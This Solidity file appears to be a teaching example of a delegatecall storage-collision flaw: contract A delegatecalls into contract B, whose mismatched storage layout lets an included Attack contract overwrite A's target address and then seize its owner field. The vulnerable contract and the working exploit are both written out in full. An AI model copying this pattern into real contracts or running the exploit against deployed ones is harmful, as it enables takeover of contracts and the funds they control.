// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract A {
    address public other;
    address public owner;
    uint public balance;

    constructor(address _other) public {
        other = _other;
        owner = msg.sender;
    }

    function delegate(uint _num) public {
        other.delegatecall(
            abi.encodeWithSignature("doSomething(uint256)", _num)
        );
    }
}

contract B {
    uint public number;

    function doSomething(uint _num) public {
        number = _num;
    }
}

// here we are changing the address of contract where contract A making a delegatecall
// and we are changing that to our attacking contract and here we can easily change the owner address

// Attack -> A -> B[delecate call] {changed the other state variable }
// Attack -> A -> Attack
contract Attack {
    address public other;
    address public owner;
    uint public balance;

    A public hackMe;

    constructor(A _hackMe) {
        hackMe = A(_hackMe);
    }

    function attack() public {
        hackMe.delegate(uint(uint160(address(this))));
        hackMe.delegate(1);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}
